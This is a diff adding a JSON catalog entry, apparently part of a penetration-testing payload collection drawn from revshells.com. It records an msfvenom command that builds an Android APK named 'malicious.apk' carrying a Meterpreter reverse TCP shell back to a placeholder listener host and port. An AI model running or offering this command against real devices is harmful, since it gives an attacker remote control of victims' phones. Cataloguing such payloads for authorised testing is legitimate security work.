@@ -1,0 +1,31 @@
+{
+  "id": "rsg-msfvenom-android-meterpreter-reverse-tcp",
+  "name": "RSG · MSFVenom · Android Meterpreter Reverse TCP",
+  "command": "msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=<lhost> lport=<lport> R -o malicious.apk",
+  "description": "M S F Venom payload — Android Meterpreter Reverse TCP (via reverse-shell-generator).",
+  "platform": "cross-platform",
+  "tags": [
+    "rsg",
+    "payload",
+    "msfvenom",
+    "msfvenom",
+    "android",
+    "android",
+    "reverse"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "MSFVenom/Android Meterpreter Reverse TCP/100",
+  "category": "payloads",
+  "subcategory": "msfvenom",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
